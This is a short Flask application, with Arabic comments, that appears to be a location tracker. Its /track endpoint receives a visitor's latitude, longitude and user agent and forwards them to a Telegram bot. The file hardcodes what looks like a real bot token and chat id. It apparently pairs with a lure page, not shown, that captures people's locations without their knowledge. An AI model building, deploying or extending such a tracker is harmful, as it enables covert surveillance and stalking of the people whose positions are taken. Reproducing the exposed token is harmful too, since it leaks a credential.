from flask import Flask, request, render_template
import requests

app = Flask(__name__)

# ضع توكن البوت ومعرف الشات هنا
TELEGRAM_BOT_TOKEN = "7087202796:AAFhcPezFo9Mk8PyscWMwwkuknoeKKRee1g"
TELEGRAM_CHAT_ID = "tqwifi_bot"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/track", methods=["GET"])
def track():
    lat = request.args.get("lat")
    lon = request.args.get("lon")
    ua = request.args.get("ua")

    if lat and lon:
        message = f"🌍 موقع جديد:\n📍 خط العرض: {lat}\n📍 خط الطول: {lon}\n🖥 الجهاز: {ua}"
        requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", 
                     params={"chat_id": TELEGRAM_CHAT_ID, "text": message})
        return "✅ تم إرسال الموقع!", 200
    return "❌ فشل في الحصول على الموقع!", 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
